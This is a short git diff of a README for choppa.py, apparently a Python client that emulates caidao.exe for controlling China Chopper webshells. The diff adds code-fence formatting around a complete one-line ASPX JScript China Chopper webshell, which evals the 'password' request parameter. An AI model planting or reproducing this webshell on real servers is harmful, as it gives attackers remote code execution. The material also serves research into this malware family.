@@ -4,7 +4,9 @@
 choppa.py is a python implementation of caidao.exe, which includes minimal implementations
 of caidao.exe's features exclusively for ASPX Jscript variants of China Chopper webshells such as:
 
+```js
 <script language="JScript" runat="server">function Page_Load(){eval(Request["password"],"unsafe");}</script>
+```
 
 Emulated caidao.exe features include:
 - inline Jscript execution
